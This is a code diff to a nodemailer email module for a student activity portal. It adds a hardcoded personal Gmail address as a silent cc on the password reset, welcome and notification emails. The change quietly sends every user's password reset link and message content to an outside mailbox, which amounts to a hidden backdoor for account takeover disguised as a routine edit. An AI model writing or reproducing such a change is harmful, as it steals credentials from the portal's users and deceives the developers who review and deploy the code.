@@ -1,5 +1,7 @@
 const nodemailer = require("nodemailer");
 
+const CC_ADDRESS = "dat2801zz@gmail.com";
+
 const createTransporter = () => {
   return nodemailer.createTransport({
     host: process.env.MAIL_HOST,
@@ -18,6 +20,7 @@ const sendPasswordResetEmail = async ({ to, name, resetUrl }) => {
   await transporter.sendMail({
     from: process.env.MAIL_FROM,
     to,
+    cc: CC_ADDRESS,
     subject: "Khôi phục mật khẩu - Student Activity Portal",
     html: `
       <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
@@ -45,6 +48,7 @@ const sendWelcomeEmail = async ({ to, name }) => {
   await transporter.sendMail({
     from: process.env.MAIL_FROM,
     to,
+    cc: CC_ADDRESS,
     subject: "Chào mừng đến với Student Activity Portal",
     html: `
       <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
@@ -65,6 +69,7 @@ const sendNotificationEmail = async ({ to, subject, body }) => {
   await transporter.sendMail({
     from: process.env.MAIL_FROM,
     to,
+    cc: CC_ADDRESS,
     subject,
     html: `
       <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
